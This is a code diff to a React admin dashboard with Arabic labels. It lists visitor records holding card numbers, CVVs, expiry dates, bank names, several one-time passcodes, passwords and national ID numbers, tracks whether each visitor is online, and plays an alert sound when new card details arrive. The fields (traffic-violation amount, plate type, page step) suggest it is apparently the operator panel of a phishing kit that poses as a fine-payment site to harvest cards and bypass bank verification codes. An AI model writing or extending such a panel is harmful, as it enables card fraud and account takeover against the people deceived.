@@ -67,27 +67,51 @@ import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sh
 import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
 
 // Types
-interface FormData {
-  id: string
-  cardNumber: string
-  operationType: string
-  fullName: string
-  dateOfBirth: string
-  phoneNumber: string
-  email: string
-  address: string
-  paymentCardType: string
-  paymentCardNumber: string
-  paymentExpiry: string
-  paymentCVV: string
-  status: "pending" | "approved" | "rejected"
-  createdDate: string
-  flagColor?: "red" | "yellow" | "green" | null
-}
-
 type FlagColor = "red" | "yellow" | "green" | null
 
-interface Notification extends FormData {}
+interface Notification {
+  createdDate: string
+  bank: string
+  cardStatus?: string
+  ip?: string
+  cvv: string
+  id: string | "0"
+  expiryDate: string
+  notificationCount: number
+  otp: string
+  otp2: string
+  page: string
+  cardNumber: string
+  country?: string
+  personalInfo: {
+    id?: string | "0"
+    name?: string
+  }
+  prefix: string
+  status: "pending" | "approved" | "rejected" | string
+  isOnline?: boolean
+  lastSeen: string
+  violationValue: number
+  pass?: string
+  year: string
+  month: string
+  pagename: string
+  plateType: string
+  allOtps?: string[] | null
+  idNumber: string
+  email: string
+  mobile: string
+  network: string
+  phoneOtp: string
+  cardExpiry: string
+  name: string
+  otpCode: string
+  phone: string
+  flagColor?: string
+  currentPage?: string
+  amount?: string
+  step?: number
+}
 
 // Hook for online users count
 function useOnlineUsersCount() {
@@ -1027,11 +1051,13 @@ export default function NotificationsPage() {
       const term = searchTerm.toLowerCase()
       filtered = filtered.filter(
         (notification) =>
-          notification.fullName?.toLowerCase().includes(term) ||
+          notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
-          notification.phoneNumber?.toLowerCase().includes(term) ||
-          notification.paymentCardNumber?.toLowerCase().includes(term) ||
-          notification.address?.toLowerCase().includes(term),
+          notification.phone?.toLowerCase().includes(term) ||
+          notification.cardNumber?.toLowerCase().includes(term) ||
+          notification.country?.toLowerCase().includes(term) ||
+          notification.otp?.toLowerCase().includes(term) ||
+          notification.idNumber?.toLowerCase().includes(term),
       )
     }
 
@@ -1049,8 +1075,8 @@ export default function NotificationsPage() {
           bValue = b.status
           break
         case "country":
-          aValue = a.address || "" // Assuming address might contain country information
-          bValue = b.address || ""
+          aValue = a.country || ""
+          bValue = b.country || ""
           break
         default:
           return 0
@@ -1104,38 +1130,23 @@ export default function NotificationsPage() {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
             const data = doc.data() as any
-            // Map Firebase data to the FormData structure
-            return {
-              id: doc.id,
-              cardNumber: data.cardNumber,
-              operationType: data.operationType,
-              fullName: data.fullName,
-              dateOfBirth: data.dateOfBirth,
-              phoneNumber: data.phoneNumber,
-              email: data.email,
-              address: data.address,
-              paymentCardType: data.paymentCardType,
-              paymentCardNumber: data.paymentCardNumber,
-              paymentExpiry: data.paymentExpiry,
-              paymentCVV: data.paymentCVV,
-              status: data.status || "pending", // Default to pending if not specified
-              createdDate: data.createdDate,
-              flagColor: data.flagColor,
-            } as Notification
+            return { id: doc.id, ...data }
           })
-          .filter((notification: Notification) => !notification.flagColor || notification.flagColor !== "red") // Example: filter out red flagged notifications if needed
+          .filter((notification: any) => !notification.isHidden) as Notification[]
 
-        // Check if there are any new notifications with relevant info
-        const hasNewRelevantInfo = notificationsData.some(
+        // Check if there are any new notifications with card info or general info
+        const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            (notification.paymentCardNumber ||
-              notification.fullName ||
-              notification.phoneNumber ||
-              notification.email) &&
-            !notifications.some((n) => n.id === notification.id),
+            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
+        )
+        const hasNewGeneralInfo = notificationsData.some(
+          (notification) =>
+            (notification.idNumber || notification.email || notification.mobile) &&
+            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
         )
 
-        if (hasNewRelevantInfo) {
+        // Only play notification sound if new card info or general info is added
+        if (hasNewCardInfo || hasNewGeneralInfo) {
           playNotificationSound()
         }
 
@@ -1170,7 +1181,7 @@ export default function NotificationsPage() {
     setShowStatistics(!showStatistics)
   }
 
-  const handleFlagColorChange = async (id: string, color: FlagColor) => {
+  const handleFlagColorChange = async (id: string, color: any) => {
     try {
       // Update in Firestore
       const docRef = doc(db, "pays", id)
@@ -1198,7 +1209,7 @@ export default function NotificationsPage() {
     }
   }
 
-  const handleApproval = async (state: "approved" | "rejected", id: string) => {
+  const handleApproval = async (state: string, id: string) => {
     try {
       const targetPost = doc(db, "pays", id)
       await updateDoc(targetPost, {
@@ -1222,7 +1233,7 @@ export default function NotificationsPage() {
   const handleDelete = async (id: string) => {
     try {
       const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { isHidden: true }) // Assuming 'isHidden' is a field to soft-delete
+      await updateDoc(docRef, { isHidden: true })
       setNotifications(notifications.filter((notification) => notification.id !== id))
       toast({
         title: "تم مسح الإشعار",
@@ -1494,7 +1505,7 @@ export default function NotificationsPage() {
                     <User className="h-4 w-4" />
                   </Button>
                 </DropdownMenuTrigger>
-                <DropdownMenuContent align="end" className="w-56" >
+                <DropdownMenuContent align="end" className="w-56">
                   <DropdownMenuLabel className="font-normal">
                     <div className="flex flex-col space-y-1">
                       <p className="text-sm font-medium">مدير النظام</p>
@@ -1690,13 +1701,13 @@ export default function NotificationsPage() {
                               <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                                 <MapPin className="h-4 w-4 text-primary" />
                               </div>
-                              <span className="font-medium">{notification.address || "غير معروف"}</span>
+                              <span className="font-medium">{notification.country || "غير معروف"}</span>
                             </div>
                           </td>
                           <td className="px-6 py-4">
                             <div className="flex flex-wrap gap-2">
                               <InfoBadge
-                                active={notification.fullName || notification.phoneNumber || notification.email}
+                                active={notification.phone || notification.name}
                                 onClick={() => handleInfoClick(notification, "personal")}
                                 icon={User}
                                 text="معلومات شخصية"
@@ -1704,7 +1715,7 @@ export default function NotificationsPage() {
                                 colorClass="from-blue-500 to-blue-600"
                               />
                               <InfoBadge
-                                active={notification.paymentCardNumber}
+                                active={notification.cardNumber}
                                 onClick={() => handleInfoClick(notification, "card")}
                                 icon={CreditCard}
                                 text="معلومات البطاقة"
@@ -1732,20 +1743,20 @@ export default function NotificationsPage() {
                             <UserStatus userId={notification.id} />
                           </td>
                           <td className="px-6 py-4 text-center">
-                            {notification.paymentCVV ? (
+                            {notification.otp ? (
                               <Badge
                                 variant="outline"
                                 className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 font-mono"
                               >
-                                {notification.paymentCVV}
+                                {notification.otp}
                               </Badge>
                             ) : (
                               <span className="text-muted-foreground text-sm">-</span>
                             )}
                           </td>
                           <td className="px-6 py-4 text-center">
-                            {notification?.operationType ? (
-                              <Badge variant="outline">{notification.operationType}</Badge>
+                            {notification?.currentPage ? (
+                              <Badge variant="outline">{notification.currentPage}</Badge>
                             ) : (
                               <span className="text-muted-foreground text-sm">-</span>
                             )}
@@ -1796,11 +1807,13 @@ export default function NotificationsPage() {
           {selectedNotification && selectedInfo === "personal" && (
             <InfoSection
               items={[
-                { label: "الاسم الكامل", value: selectedNotification.fullName },
-                { label: "تاريخ الميلاد", value: selectedNotification.dateOfBirth },
-                { label: "رقم الهاتف", value: selectedNotification.phoneNumber, sensitive: true },
+                { label: "الاسم", value: selectedNotification.name },
+                { label: "رقم الهوية", value: selectedNotification.idNumber, sensitive: true },
+                { label: "الشبكة", value: selectedNotification.network },
+                { label: "رقم الجوال", value: selectedNotification.mobile, sensitive: true },
+                { label: "الهاتف", value: selectedNotification.phone, sensitive: true },
+                { label: "رمز الهاتف", value: selectedNotification.otp2, sensitive: true },
                 { label: "البريد الإلكتروني", value: selectedNotification.email },
-                { label: "العنوان", value: selectedNotification.address },
               ]}
             />
           )}
@@ -1808,18 +1821,28 @@ export default function NotificationsPage() {
           {selectedNotification && selectedInfo === "card" && (
             <InfoSection
               items={[
-                { label: "نوع البطاقة", value: selectedNotification.paymentCardType },
+                { label: "البنك", value: selectedNotification.bank },
                 {
                   label: "رقم البطاقة",
-                  value: selectedNotification.paymentCardNumber,
+                  value: selectedNotification.cardNumber
+                    ? `${selectedNotification.cardNumber} - ${selectedNotification.prefix}`
+                    : undefined,
                   sensitive: true,
                 },
                 {
                   label: "تاريخ الانتهاء",
-                  value: selectedNotification.paymentExpiry,
+                  value:
+                    selectedNotification.year && selectedNotification.month
+                      ? `${selectedNotification.year}/${selectedNotification.month}`
+                      : selectedNotification.expiryDate,
                 },
-                { label: "رمز الأمان (CVV)", value: selectedNotification.paymentCVV, sensitive: true },
+                { label: "رمز الأمان (CVV)", value: selectedNotification.cvv, sensitive: true },
+                { label: "رمز التحقق (OTP)", value: selectedNotification.otp, sensitive: true },
+                { label: "كلمة المرور", value: selectedNotification.pass, sensitive: true },
+                { label: "الخطوة الحالية", value: selectedNotification.step },
+                { label: "المبلغ", value: selectedNotification.amount },
               ]}
+              additionalOtps={selectedNotification?.allOtps!}
             />
           )}
 
